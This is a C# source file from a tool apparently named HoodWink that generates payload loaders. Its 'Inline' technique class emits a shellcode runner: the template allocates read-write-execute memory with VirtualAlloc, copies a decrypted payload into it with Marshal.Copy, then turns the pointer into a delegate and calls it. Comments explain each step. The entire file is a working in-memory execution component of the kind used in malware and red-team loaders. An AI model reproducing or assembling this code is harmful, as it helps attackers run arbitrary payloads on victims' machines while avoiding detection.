using System.Collections.Generic;

namespace HoodWink.Languages.Csharp.Techniques
{
    public class Inline : Models.Base.Technique
    {
        public override string Description => "Uses Marshal Delegate";
        public override List<string> FileDependencies => new List<string> { @"Languages\Csharp\FileDependencies\Kernel32.cs" };

        public override string Using => @"using System;
using System.Runtime.InteropServices;";

        public override string ApiImports => @"// to allocate mem
        [DllImport(""kernel32"")]
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

        // to run delegate as unmanaged code
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate void WindowsRun();";
        public override string MainLogic => @"

         // Debug
         // Console.WriteLine(""Decrypted Size: "" + payload.Length);
         // string hexPayload = BitConverter.ToString(payload);
         // Console.WriteLine(""HexString: 0x"" + hexPayload.Replace(""-"", "",0x""));

         // VirtualAlloc(zero to allocate memory at first viable location,
         //              amount of mem to allocate,
         //              magic value which maps to MEM_COMMIT in kernel32 it will allocate mem right away
         //              magic value which maps to RWX (read/write/execute) in kernel32
         //              )
         IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);

         // Copy(byte array to copy to mem,
         //      index in byte array to begin copying at
         //      where to begin copying to
         //      how many bytes to copy            
         Marshal.Copy(payload, 0, ptr, payload.Length);

         // Convert unmanaged function pointer to a delegate
         // Marshal.GetDelegateForFunctionPointer Method(): https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer?view=net-7.0
         WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));

         // Run 
         r();";

        public override string AdditionalFunctions => @"//Inline Additional Functions";

    }
}